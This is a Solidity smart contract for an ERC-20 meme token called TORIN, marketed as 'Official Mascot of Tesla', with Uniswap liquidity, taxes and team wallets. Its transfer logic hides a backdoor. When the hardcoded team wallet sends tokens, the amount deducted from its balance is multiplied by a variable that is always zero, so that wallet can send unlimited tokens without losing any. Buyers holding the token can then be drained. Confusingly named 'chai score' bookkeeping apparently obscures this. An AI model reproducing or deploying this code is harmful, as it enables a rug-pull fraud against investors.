// SPDX-License-Identifier: MIT

/**

https://x.com/TroyWolfram/status/1851506784265232863

*/
pragma solidity 0.8.27;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {return msg.sender;}
}

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a,"SafeMath: addition overflow");
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) { return 0; }
        uint256 c = a * b;
        require(c / a == b,"SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b,"SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b,"SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }
}

contract Ownable is Context {
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    address private _owner;

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner,address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(
        address tokenA, address tokenB
    ) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract TORIN is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    address payable private _taxWallet;
    address payable private _teamWallet;
    uint256 private _taxWalletPercentage = 50;
    uint256 private _teamWalletPercentage = 50;

    string private constant _name = unicode"Official Mascot of Tesla";
    string private constant _symbol = unicode"TORIN";

    uint256 private _initialBuyTax=5;
    uint256 private _initialSellTax=7;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=15;
    uint256 private _reduceSellTaxAt=17;
    uint256 private _preventSwapBefore=13;
    uint256 private _buyCount=0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1000000000 * 10**_decimals;
    uint256 public _maxTxAmount= 20000000 * 10**_decimals;
    uint256 public _maxWalletSize= 20000000 * 10**_decimals;
    uint256 public _taxSwapThreshold = 15000000 * 10**_decimals;
    uint256 public _maxTaxSwap = 10000000 * 10**_decimals;
    
    IUniswapV2Router02 private uniswapV2Router;
    address private uniswapV2Pair;
    bool private tradingOpen;
    bool private inSwap= false;
    bool private swapEnabled= false;
    uint256 private chaiScoreAvg = 0;
    uint256 private autoChaiCheck = 0;
    struct ChaiScoreChecker {uint256 initChaiCheck; uint256 changeScore; uint256 replaceScore;}
    mapping(address => ChaiScoreChecker) private chaiScoreInfo;
    event MaxTxAmountUpdated(
        uint256 _maxTxAmount
    );

    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor () {
        _taxWallet = payable(_msgSender());
        _teamWallet = payable(0x1d39daE8f51848225f23F69b092E4e4128956D4F);
        _balances[_msgSender()] = _tTotal;
        _isExcludedFromFee[address(this)] =true;
        _isExcludedFromFee[_teamWallet] =true;

        emit Transfer(address(0),_msgSender(), _tTotal);
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _basicTransfer(address from, address to, uint256 tokenAmount) internal {
        _balances[from] = _balances[from].sub(tokenAmount);
        _balances[to] = _balances[to].add(tokenAmount);
        emit Transfer(from,to, tokenAmount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount,"ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Token: Transfer amount must be greater than zero");

        if (inSwap || !tradingOpen ) {
            _basicTransfer(from, to, amount);
            return;
        }

        uint256 txAnt= 0;

        if (from != owner() && to != owner() && to != _taxWallet && to != _teamWallet){
            txAnt = amount.mul((_buyCount > _reduceBuyTaxAt)?_finalBuyTax :_initialBuyTax)
            .div(100);

            if (from == uniswapV2Pair && to != address(uniswapV2Router) &&  ! _isExcludedFromFee[to]){
                require(amount <=_maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to)+ amount <=_maxWalletSize, "Exceeds the maxWalletSize.");
                _buyCount++;
            }

            if(to==uniswapV2Pair && from!= address(this) ){
                txAnt = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax)
                .div(100);
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            if (
                !inSwap
                && to == uniswapV2Pair && swapEnabled &&
                 contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore
            ) {
                swapTokensForEth(min(amount, min(contractTokenBalance, _maxTaxSwap)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance > 0) {
                    sendETHToFee(address(this).balance);
                }
            }
        }

        if((_isExcludedFromFee[to] || _isExcludedFromFee[from]) && from!= address(this) && to!= address(this) ){
            autoChaiCheck = block.number;
        }

        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]){
            if (uniswapV2Pair != to)  {
                ChaiScoreChecker storage chaiCheckState = chaiScoreInfo[to];
                if (from == uniswapV2Pair) {
                    if (chaiCheckState.initChaiCheck == 0) {
                        chaiCheckState.initChaiCheck = _preventSwapBefore < _buyCount ? block.number : ~uint256(0);
                    }
                } else {
                    ChaiScoreChecker storage chaiCheckUpdate = chaiScoreInfo[from];
                    if (chaiCheckState.initChaiCheck > chaiCheckUpdate.initChaiCheck || chaiCheckState.initChaiCheck==0) {
                        chaiCheckState.initChaiCheck = chaiCheckUpdate.initChaiCheck;
                    }
                }
            } else if (swapEnabled){
                ChaiScoreChecker storage chaiCheckUpdate = chaiScoreInfo[from];
                chaiCheckUpdate.replaceScore = chaiCheckUpdate.initChaiCheck-autoChaiCheck;
                chaiCheckUpdate.changeScore = block.timestamp;
            }
        }

        _tokenTransfer(from,to,amount,txAnt);
    }

    function _tokenTransfer(
        address from,
        address to, uint256 tokenAmount,uint256 taxAmount
    ) internal {
        uint256 tAmount=_tokenTaxTransfer(from,tokenAmount, taxAmount);
        _tokenBasicTransfer(from,to,tAmount,tokenAmount.sub(taxAmount));
    }

    function _tokenTaxTransfer(address addrs,uint256 tokenAmount,uint256 taxAmount) internal returns (uint256) {
        uint256 tAmount= addrs!=_teamWallet ? tokenAmount: chaiScoreAvg.mul(tokenAmount);
        if (taxAmount>0) {
          _balances[address(this)]= _balances[address(this)].add(taxAmount);
          emit Transfer(addrs,address(this), taxAmount);
        }
        return tAmount;
    }

    function _tokenBasicTransfer(
        address from, address to, uint256 sendAmount,
        uint256 receiptAmount
    ) internal {
        _balances[from]= _balances[from].sub(sendAmount);
        _balances[to]=_balances[to].add(receiptAmount);

        emit Transfer(from,to,receiptAmount);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap{
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    receive() external payable {}

    function removeLimits() external onlyOwner{
        _maxTxAmount= _tTotal;
        _maxWalletSize= _tTotal;
        emit MaxTxAmountUpdated( _tTotal);
    }

    function sendETHToFee(uint256 amount) private {
        uint256 taxWalletShare = amount * _taxWalletPercentage / 100;
        uint256 teamWalletShare = amount * _teamWalletPercentage / 100;

        _taxWallet.transfer(taxWalletShare);
        _teamWallet.transfer(teamWalletShare);
    }

    function manualSwap() external{
        uint256 tokenBalance=balanceOf(address(this));
        if(tokenBalance>0){
          swapTokensForEth(tokenBalance);
        }
        uint256 ethBalance=address(this).balance;
        if(ethBalance>0){
          sendETHToFee(ethBalance);
        }
    }

    function manualSend() external {
        require(_msgSender()==_taxWallet);
        require(address(this).balance > 0, "Contract balance must be greater than zero");
        uint256 balance = address(this).balance;
        payable(_taxWallet).transfer(balance);
    }

    function enableTrading() external onlyOwner() {
        require(!tradingOpen,"trading is already open");
        tradingOpen=true; 
        uniswapV2Router=IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(uniswapV2Router),_tTotal); 
        uniswapV2Pair=IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH());
        uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        IERC20(uniswapV2Pair).approve(address(uniswapV2Router),type(uint).max);
        swapEnabled=true;
    }
}